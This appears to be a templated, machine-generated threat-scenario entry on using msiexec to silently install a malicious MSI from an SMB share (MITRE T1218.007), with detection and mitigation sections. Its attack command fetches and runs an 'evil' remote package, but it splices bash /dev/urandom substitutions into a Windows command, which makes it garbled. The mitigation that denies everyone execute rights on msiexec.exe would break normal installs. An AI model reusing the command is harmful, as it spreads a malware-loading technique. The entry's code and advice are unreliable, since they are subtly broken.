---
type: campaign
scenario_id: 220
tactic: Defense Evasion
technique: "T1218.007: Msiexec"
technique_id: T1218.007
tags: [campaign, lotl, defense_evasion]
---

# Using msiexec to execute malicious MSI via SMB share.

## Threat Description
Using msiexec to execute malicious MSI via SMB share.

## Attack Command
```
msiexec /quiet /i \\$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)\$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).msi) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)
```

## Detection Logic
Monitor msiexec SMB: `wmic process where name='msiexec.exe' get commandline | findstr \\`; YARA rule: `rule MsiexecSmb { strings: $a = /msiexec.*\\/ nocase; condition: $a }`.

## Mitigation
Restrict msiexec: `icacls %windir%\System32\msiexec.exe /deny Everyone:RX`; Block SMB: `netsh advfirewall firewall add rule name='Block SMB' dir=in action=block protocol=TCP localport=445`.

## AI Training Prompt
Train AI to detect msiexec SMB execution and suggest SMB restrictions.

## References
- MITRE ATT&CK T1218.007: https://attack.mitre.org/techniques/T1218/007/
- CWE-78: https://cwe.mitre.org/data/definitions/78.html
